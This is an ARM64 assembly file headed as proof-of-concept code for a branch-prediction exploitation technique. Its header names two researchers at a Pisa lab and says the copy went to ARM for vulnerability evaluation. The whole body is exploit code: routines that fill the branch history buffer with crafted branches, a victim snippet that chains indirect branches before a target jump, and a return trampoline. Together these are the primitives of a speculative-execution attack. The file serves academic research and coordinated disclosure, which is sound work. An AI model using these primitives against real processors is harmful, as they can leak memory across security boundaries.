/*
 * PoC Codes for Bias-Free Branch Predicion Exploitation
 * 
 * Thursday, September 12th 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

.text

.macro ops_barrier n
    dsb sy
    isb
.rept \n
    nop
.endr
.endm

.altmacro
.macro padding_nop n
.rept \n
    nop
.endr
.endm

.altmacro
.macro __specbse_victim_BH_n
.global __specbse_victim_BH_n_\@
    // load IB offset from the offset array
    ldr w7, [x1, x8]
    // calc the actual IB dest from the base addr of ret mem
    add x7, x0, w7, uxtw
    // let's go to the ret memory!
__specbse_victim_BH_\@:
    blr x7
    // increase iteration index
    add x8, x8, #4
.endm

.altmacro
.macro custom_tbz reg nbit
    tbz \reg, \nbit, #16
    nop
    nop
    nop
.endm

// Populate the canonical BHB with conditional branches
.align 4
.global populate_bhb_tbz
populate_bhb_tbz:
.set i,0
.rept 8
    custom_tbz x0, %i
.set i,i+1
.endr
    ret

.align 4
.global specbse_victim_snippet
.global __specbse_victim_align
.global __specbse_victim_end
specbse_victim_snippet:
    // temporarily store return address
    mov x15, x30
    // initialize iteration index
    mov x8, 0
__specbse_victim_align:
.set i,0
.rept 6
    __specbse_victim_BH_n
.set i,i+1
.endr
    // emit an instruction barrier (and 64 nops) to wait for BPU fully updated!
    ops_barrier 64
    // setup parameters for gadgets
    mov x0, x3
    mov x1, x4
    // load indirect branch target
    ldr x2, [x2]
    // let's go
    blr x2
    // recover the actual return address
    mov x30, x15
    // go back home!
    ret
__specbse_victim_end:


.align 4
.global ret_tramp
ret_tramp:
.rept 32
    ret
.endr


.align 4
.global populate_bhb
populate_bhb:
loop:
    b #4
    subs x0, x0, #1
    b.ne loop
    dsb ish
    isb
    ret
